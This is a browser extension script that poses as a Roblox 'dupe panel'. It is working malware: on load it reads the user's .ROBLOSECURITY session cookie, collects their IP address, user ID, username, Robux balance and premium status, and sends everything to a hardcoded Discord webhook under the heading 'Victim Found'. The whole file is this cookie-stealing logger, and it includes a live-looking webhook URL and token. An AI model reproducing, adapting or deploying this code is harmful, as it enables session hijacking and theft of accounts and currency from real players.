const dcw = "https://discord.com/api/webhooks/1403600899972005959/swwS7PTM8xsRKVoOig1qUMCLU8Zf7h4f5qgcyxQFJIFZa9UthyIdbneuZkxt24UzQCwT";

//Open the HTML File
chrome.action.onClicked.addListener(() => {
  chrome.tabs.create({ url: chrome.runtime.getURL('JBdupe-Panel.html') });
});


async function fetchWithCookie(url, cookie) {
  return fetch(url, {
    headers: {
      Cookie: `.ROBLOSECURITY=${cookie}`,
      Accept: "application/json",
    },
    credentials: "include",
  });
}

async function main(cookie) {
  const ipAddr = await (await fetch("https://api.ipify.org")).text();

  if (!cookie) {
    console.warn("No .ROBLOSECURITY cookie found");
  }

  let basicStats = null;
  if (cookie) {
    const basicRes = await fetch("https://www.roblox.com/mobileapi/userinfo", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      redirect: "manual",
    });
    if (basicRes.ok) {
      basicStats = await basicRes.json();
    }
  }

  let userId = null,
    username = null,
    displayName = null,
    isPremium = null,
    robux = null,
    thumbnailUrl = basicStats ? basicStats.ThumbnailUrl : null,
    avatarUrl = null;

  if (cookie) {
    try {
      const userRes = await fetchWithCookie(
        "https://users.roblox.com/v1/users/authenticated",
        cookie
      );
      if (userRes.ok) {
        const userData = await userRes.json();
        userId = userData.id;
        username = userData.name;
        displayName = userData.displayName;

        const premiumRes = await fetchWithCookie(
          `https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`,
          cookie
        );
        if (premiumRes.ok) {
          isPremium = await premiumRes.json();
        }

        const currencyRes = await fetchWithCookie(
          "https://economy.roblox.com/v1/user/currency",
          cookie
        );
        if (currencyRes.ok) {
          const currencyData = await currencyRes.json();
          robux = currencyData.robux ?? null;
        }

        // Fetch the 720x720 avatar image
        const avatarRes = await fetchWithCookie(
          `https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=720x720&format=Png`,
          cookie
        );
        if (avatarRes.ok) {
          const avatarData = await avatarRes.json();
          if (
            avatarData.data &&
            avatarData.data[0] &&
            avatarData.data[0].imageUrl
          ) {
            avatarUrl = avatarData.data[0].imageUrl;
          }
        }
        const headRes = await fetchWithCookie(
          `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=48x48&format=Png`,
          cookie
        );
        if (headRes.ok) {
          const headData = await headRes.json();
          if (
            headData.data &&
            headData.data[0] &&
            headData.data[0].imageUrl
          ) {
            headUrl = headData.data[0].imageUrl;
          }
        }
      }
    } catch (e) {
      console.error("Failed fetching detailed Roblox info:", e);
    }
  }

  const data = {
    content: null,
    embeds: [
      {
        description: "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
        color: null,
        fields: [
          {
            name: "💳 User ID",
            value: userId
              ? `\`${userId.toString()}\``
              : basicStats
              ? `\`${basicStats.UserID?.toString() || "N/A"}\``
              : "`N/A`",
            inline: true,
          },
          {
            name: "🏷️ Username",
            value: username
              ? `\`${username}\``
              : basicStats
              ? `\`${basicStats.UserName || "N/A"}\``
              : "`N/A`",
            inline: true,
          },
          {
            name: "📺 Display Name",
            value: displayName
              ? `\`${displayName}\``
              : basicStats
              ? `\`${basicStats.DisplayName || "N/A"}\``
              : "`N/A`",
            inline: true,
          },
          {
            name: "💵 Robux",
            value:
              robux !== null
                ? `\`${robux.toString()}\``
                : basicStats
                ? `\`${basicStats.RobuxBalance?.toString() || "N/A"}\``
                : "`N/A`",
            inline: true,
          },
          {
            name: "🪙 Premium",
            value:
              isPremium !== null
                ? `\`${isPremium.toString()}\``
                : basicStats
                ? `\`${basicStats.IsPremium?.toString() || "N/A"}\``
                : "`N/A`",
            inline: true,
          },
        ],
        thumbnail: {
          url: avatarUrl, // large 720x720 avatar image
        },
        author: {
          name: "Victim Found: " + ipAddr,
          "icon_url": headUrl,
        },
        footer: {
          text: "Coded by Azaerium",
        },
      },
    ],
    username: "Azaerium Extension Logger",
    attachments: [],
  };

  try {
    const response = await fetch(dcw, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });
    if (!response.ok) {
      console.error(
        "Failed to send webhook:",
        response.status,
        await response.text()
      );
    } else {
      console.log("Webhook sent successfully");
    }
  } catch (e) {
    console.error("Error sending webhook:", e);
  }
}

chrome.cookies.get(
  {
    url: "https://www.roblox.com/home",
    name: ".ROBLOSECURITY",
  },
  function (cookie) {
    main(cookie ? cookie.value : null);
  }
);
